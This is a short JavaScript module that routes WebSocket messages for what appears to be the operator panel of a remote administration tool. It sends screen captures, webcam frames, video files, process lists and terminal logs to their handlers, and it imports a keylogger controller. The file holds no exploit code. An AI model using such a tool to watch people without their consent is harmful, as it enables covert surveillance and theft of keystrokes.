import * as Auth from '../controllers/auth.js';
import * as Monitor from '../controllers/monitor.js';
import * as Terminal from '../controllers/terminal.js';
import * as Process from '../controllers/process.js';
import * as Dashboard from '../controllers/dashboard.js';
import * as Webcam from '../controllers/webcam.js';
import * as Keylogger from '../controllers/keylogger.js';
import { showToast } from '../utils/ui.js';

export function routeMessage(event) {
    if (event.data instanceof ArrayBuffer) {
        Monitor.handleBinaryStream(event.data);
    } else {
        try {
            const msg = JSON.parse(event.data);
            switch (msg.type) {
                case "AUTH_RESULT": Auth.handleAuthResult(msg.payload); break;
                case "SCREENSHOT_FILE": Monitor.handleScreenshotFile(msg.payload); break;
                case "SCREEN_CAPTURE": Monitor.handleScreenCapture(msg.payload); break;
                case "LOG": Terminal.handleLog(msg.payload); break;
                case "APP_LIST": Process.renderProcessTable(msg.payload); break;
                case "PROCESS_LIST": Process.renderProcessTable(msg.payload); break;
                case "INSTALLED_LIST": Dashboard.handleInstalledList(msg.payload); break;
                case "VIDEO_FILE": Webcam.handleVideoFile(msg.payload); break;
                case "WEBCAM_FRAME": Webcam.handleWebcamFrame(msg.payload); break;
            }
        } catch (e) {
            console.error("JSON Error:", e);
        }
    }
}